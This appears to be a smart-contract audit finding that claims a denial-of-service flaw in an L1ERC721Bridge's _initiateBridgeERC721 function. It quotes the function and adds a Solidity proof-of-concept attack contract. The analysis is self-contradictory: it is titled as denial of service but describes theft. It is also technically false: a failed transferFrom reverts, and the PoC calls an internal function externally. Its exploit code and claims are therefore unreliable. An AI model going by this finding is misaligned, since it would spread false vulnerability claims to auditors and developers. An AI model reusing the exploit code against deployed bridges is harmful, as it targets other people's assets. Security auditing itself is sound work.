# Potential Denial of Service Attack

## Summary
The L1ERC721Bridge contract has a vulnerability that can allow an attacker to lock and freeze any ERC721 token in the contract, rendering it unusable.
## Vulnerability Detail
The vulnerability lies in the _initiateBridgeERC721 function, where tokens are locked into the bridge using the deposits mapping. In this function, if the transferFrom call fails for any reason, the tokens will remain locked in the bridge and cannot be used or withdrawn by their rightful owners. The function does not provide any mechanism to unlock the tokens or revert the transaction, leaving them permanently frozen in the bridge.
## Impact
An attacker can exploit this vulnerability to render any ERC721 token unusable by initiating a bridge transaction with invalid parameters, causing the transferFrom call to fail. Once the tokens are locked in the bridge, their owners will be unable to use or withdraw them, causing financial loss and frustration.
## Code Snippet
function _initiateBridgeERC721(
    address _localToken,
    address _remoteToken,
    address _from,
    address _to,
    uint256 _tokenId,
    uint32 _minGasLimit,
    bytes calldata _extraData
) internal override {
    require(_remoteToken != address(0), "L1ERC721Bridge: remote token cannot be address(0)");

    // Construct calldata for _l2Token.finalizeBridgeERC721(_to, _tokenId)
    bytes memory message = abi.encodeWithSelector(
        L2ERC721Bridge.finalizeBridgeERC721.selector,
        _remoteToken,
        _localToken,
        _from,
        _to,
        _tokenId,
        _extraData
    );

    // Lock token into bridge
    deposits[_localToken][_remoteToken][_tokenId] = true;
    IERC721(_localToken).transferFrom(_from, address(this), _tokenId);

    // Send calldata into L2
    MESSENGER.sendMessage(OTHER_BRIDGE, message, _minGasLimit);
    emit ERC721BridgeInitiated(_localToken, _remoteToken, _from, _to, _tokenId, _extraData);
}
In this code snippet, the tokens are locked into the bridge using the deposits mapping, and the transferFrom function is used to transfer ownership of the token to the bridge contract. If the transferFrom function fails for any reason, the tokens remain locked in the bridge, causing the vulnerability to be exploited.
## Tool used

Manual Review

## POC
attacker would need to call the _initiateBridgeERC721 function with a fake _remoteToken address. This would allow the attacker to lock the victim's ERC721 token into the bridge by setting deposits[_localToken][_remoteToken][_tokenId] = true, where _localToken is the victim's ERC721 token address, _remoteToken is the attacker's fake address, and _tokenId is the victim's token ID.

The attacker would then trigger the bridge finalization process by calling the finalizeBridgeERC721 function on the attacker's own ERC721 bridge contract with the same _tokenId and _extraData values. Since the onlyOtherBridge modifier is only checking if the function is called by the legitimate bridge contract, this check would pass for the attacker's contract as well.

As a result, the victim's ERC721 token would be transferred to the attacker's intended recipient address on the other network instead of the victim's intended recipient address.

Here's an example proof of concept code that demonstrates this exploit:
pragma solidity 0.8.15;

contract AttackERC721Bridge {
    address public L1Bridge;

    constructor(address _L1Bridge) {
        L1Bridge = _L1Bridge;
    }

    function initiateAttack(address _localToken, address _from, address _to, uint256 _tokenId, bytes calldata _extraData) external {
        bytes memory message = abi.encodeWithSelector(
            bytes4(keccak256("finalizeBridgeERC721(address,address,address,address,uint256,bytes)")),
            address(this),
            _localToken,
            _from,
            _to,
            _tokenId,
            _extraData
        );

        // Lock token into bridge
        (bool success,) = L1Bridge.call(
            abi.encodeWithSelector(
                bytes4(keccak256("_initiateBridgeERC721(address,address,address,address,uint256,uint32,bytes)")),
                _localToken,
                address(this),
                _from,
                _to,
                _tokenId,
                0,
                ""
            )
        );
        require(success, "AttackERC721Bridge: failed to initiate bridge");

        // Send calldata into L2
        (success,) = L1Bridge.call(
            abi.encodeWithSelector(
                bytes4(keccak256("sendMessage(address,bytes,uint32)")),
                address(this),
                message,
                0
            )
        );
        require(success, "AttackERC721Bridge: failed to send message");
    }
}
In this proof of concept code, the attacker deploys a contract that has a finalizeBridgeERC721 function that takes the same parameters as the legitimate bridge contract's finalizeBridgeERC721 function. The initiateAttack function on this contract locks the victim's ERC721 token into the bridge by calling _initiateBridgeERC721 on the legitimate bridge contract with a fake _remoteToken address (which is the address of the attacker's contract). The attacker then triggers the bridge finalization process by calling finalizeBridgeERC721 on the attacker's contract with the same _tokenId and _extraData values.
